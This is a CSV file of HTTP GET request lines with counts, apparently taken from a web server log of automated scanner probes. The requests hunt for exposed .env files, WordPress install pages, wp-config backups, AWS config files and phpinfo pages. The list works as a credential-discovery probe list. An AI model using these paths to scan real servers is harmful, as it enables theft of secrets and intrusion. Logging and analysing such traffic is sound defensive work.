url,count
GET /wp/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /new HTTP/1.1,1
GET /new/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /old/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /.env.example HTTP/1.1,1
GET /shop/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /lab/.env HTTP/1.1,1
GET /vendor/.env HTTP/1.1,1
GET /.production HTTP/1.1,1
GET /.local HTTP/1.1,1
GET /.remote HTTP/1.1,1
GET /shop/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /shop HTTP/1.1,1
GET /exapi/.env HTTP/1.1,1
GET /test/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /test/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /test HTTP/1.1,1
GET /blog/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /blog/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /blog HTTP/1.1,1
GET /cronlab/.env HTTP/1.1,1
GET /cron/.env HTTP/1.1,1
GET /core/app/.env HTTP/1.1,1
GET /storage/.env HTTP/1.1,1
GET /sendgrid.env HTTP/1.1,1
GET /administrator/.env HTTP/1.1,1
GET /v2/.env HTTP/1.1,1
GET /v1/.env HTTP/1.1,1
GET /tools/.env HTTP/1.1,1
GET /old/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /en/.env HTTP/1.1,1
GET /psnlink/.env HTTP/1.1,1
GET /saas/.env HTTP/1.1,1
GET /sitemaps/.env HTTP/1.1,1
GET /assets/.env HTTP/1.1,1
GET /config/.env HTTP/1.1,1
GET /core/Datavase/.env HTTP/1.1,1
GET /web/.env] HTTP/1.1,1
GET /.env.bak HTTP/1.1,1
GET /.env.live HTTP/1.1,1
GET /_static/.env HTTP/1.1,1
GET /.docker/.env HTTP/1.1,1
GET /.env.swp HTTP/1.1,1
GET /.env.uat HTTP/1.1,1
GET /.env.www HTTP/1.1,1
GET /.env_1 HTTP/1.1,1
GET /.env_sample HTTP/1.1,1
GET /.env.backup HTTP/1.1,1
GET /src/.env HTTP/1.1,1
GET /files/.env HTTP/1.1,1
GET /product/.env.staging HTTP/1.1,1
GET /content/.env HTTP/1.1,1
GET /storage/.env.local HTTP/1.1,1
GET /.env.local HTTP/1.1,1
GET /media/.env HTTP/1.1,1
GET /Nmap/folder/check1713372128 HTTP/1.1,1
GET /env/.env HTTP/1.1,1
GET /index.js HTTP/1.1,1
GET /cgi-bin/.env HTTP/1.1,1
GET /audio/.env HTTP/1.1,1
GET /app/config/.env HTTP/1.1,1
GET /crm/.env HTTP/1.1,1
GET /old/.env HTTP/1.1,1
GET /new/.env HTTP/1.1,1
GET /icons/.env HTTP/1.1,1
GET /library/.env HTTP/1.1,1
GET /wp-content/.env HTTP/1.1,1
GET /conf/.env HTTP/1.1,1
GET /.environment HTTP/1.1,1
GET /index1.php HTTP/1.1,1
GET /index.php HTTP/1.1,1
GET /index.json HTTP/1.1,1
GET /user/.env.staging HTTP/1.1,1
GET /base/.env HTTP/1.1,1
GET /newsite/.env HTTP/1.1,1
GET /config.js HTTP/1.1,1
GET /.env.sample.php HTTP/1.1,1
GET /.env.production.local HTTP/1.1,1
GET /.env.docker.dev HTTP/1.1,1
GET /.env.development.local HTTP/1.1,1
GET /.envs HTTP/1.1,1
GET /.envrc HTTP/1.1,1
GET /config/aws.yml HTTP/1.1,1
GET /vendor/laravel/.env HTTP/1.1,1
GET /aws.yml HTTP/1.1,1
GET /%c0 HTTP/1.1,1
GET /wp-config.php-backup HTTP/1.1,1
GET /aws.env HTTP/1.1,1
GET /sites/all/libraries/mailchimp/.env HTTP/1.1,1
GET /www/.env HTTP/1.1,1
GET /.env.stage HTTP/1.1,1
GET /.env.staging HTTP/1.1,1
GET /test1.php HTTP/1.1,1
GET /test1 HTTP/1.1,1
GET /test0.php HTTP/1.1,1
GET /test.php HTTP/1.1,1
GET /.phpinfo HTTP/1.1,1
GET /php.php HTTP/1.1,1
GET /protected/.env HTTP/1.1,1
GET /pinfo.php HTTP/1.1,1
GET /.env~ HTTP/1.1,1
GET /.env.{{SD}} HTTP/1.1,1
GET /.env.{{DN}} HTTP/1.1,1
GET /.env.test.localapi/.env HTTP/1.1,1
GET /.env.test.local HTTP/1.1,1
GET /.env.test HTTP/1.1,1
GET /pi.php HTTP/1.1,1
GET /1_1_PhpInfo.php HTTP/1.1,1
GET /wp-config.orig HTTP/1.1,1
GET /test2.php HTTP/1.1,1
GET /test_info2.php HTTP/1.1,1
GET /test_phpinfo2.php HTTP/1.1,1
GET /test_phpinfo1.php HTTP/1.1,1
GET /test_phpinfo.php HTTP/1.1,1
GET /test_info5.php HTTP/1.1,1
GET /test_info4.php HTTP/1.1,1
GET /test_info3.php HTTP/1.1,1
GET /test_info1.php HTTP/1.1,1
GET /test_phpinfo4.php HTTP/1.1,1
GET /test_info.php HTTP/1.1,1
GET /test9.php HTTP/1.1,1
GET /test8.php HTTP/1.1,1
GET /test7.php HTTP/1.1,1
GET /test6.php HTTP/1.1,1
GET /test5.php HTTP/1.1,1
GET /test_phpinfo3.php HTTP/1.1,1
GET /test_phpinfo5.php HTTP/1.1,1
GET /dashboardadmin/phpinfo HTTP/1.1,1
GET /viewinfo.php HTTP/1.1,1
GET /inf.php HTTP/1.1,1
GET /testphp.php HTTP/1.1,1
GET /testphpinfo HTTP/1.1,1
GET /testphpinfo.php HTTP/1.1,1
GET /tester.php HTTP/1.1,1
GET /testing.php HTTP/1.1,1
GET /info.json HTTP/1.1,1
GET /info3.php HTTP/1.1,1
GET /infophp.php HTTP/1.1,1
GET /info/info.php HTTP/1.1,1
GET /info/phpinfo HTTP/1.1,1
GET /info/phpinfo.php HTTP/1.1,1
GET /info1.php HTTP/1.1,1
GET /info2.php HTTP/1.1,1
GET /info4.php HTTP/1.1,1
GET /infophp/index.php HTTP/1.1,1
GET /asdf.php HTTP/1.1,1
GET /phpinfo4.php HTTP/1.1,1
GET /phpsysinfo.php HTTP/1.1,1
GET /phpsysinfo HTTP/1.1,1
GET /phpversion.php HTTP/1.1,1
GET /phptest.php HTTP/1.1,1
GET /phpinfodev.php HTTP/1.1,1
GET /phpinfos.php HTTP/1.1,1
GET /phpinfo3.php HTTP/1.1,1
GET /p.php HTTP/1.1,1
GET /phpinfo2.php HTTP/1.1,1
GET /phpinfo1.php HTTP/1.1,1
GET /ini.php HTTP/1.1,1
GET /infos.php HTTP/1.1,1
GET /information.php HTTP/1.1,1
GET /information HTTP/1.1,1
GET /pi.php5 HTTP/1.1,1
